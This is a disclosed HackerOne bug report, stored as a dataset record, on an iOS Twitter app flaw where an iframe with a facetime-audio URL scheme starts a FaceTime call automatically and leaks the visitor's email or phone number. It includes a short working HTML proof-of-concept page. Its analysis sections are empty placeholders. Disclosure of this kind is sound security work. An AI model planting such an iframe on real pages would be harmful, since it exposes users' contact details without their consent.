---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '28500'
original_report_id: '28500'
title: iOS App can establish Facetime calls without user's permission
weakness: Cross-Site Request Forgery (CSRF)
team_handle: x
created_at: '2014-09-18T18:35:13.304Z'
disclosed_at: '2015-04-27T13:03:04.167Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# iOS App can establish Facetime calls without user's permission

## Metadata

- HackerOne Report ID: 28500
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: x
- Disclosed At: 2015-04-27T13:03:04.167Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

When URL Schemes for local applications are inserted in an inline frame, the web view launches them automatically.

###Example###: 


    <html>
    <header><title>Facetime Audio URL Scheme Test</title></header>
    <body>
    <iframe src="facetime-audio://guillaume@binaryfactory.ca"></iframe>
    </body>
    </html>

This page ( which you can also find at http://binaryfactory.ca/urlschemes/facetime.html ) - when loaded from Twitter on iOS (including 8), automatically establishes a Facetime Audio call to me, leaking the user's email address or phone number (caller ID information for their Facetime account).

I marked this as a CSRF but that isn't technically correct, but it is similar in behavior.

Thank you.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
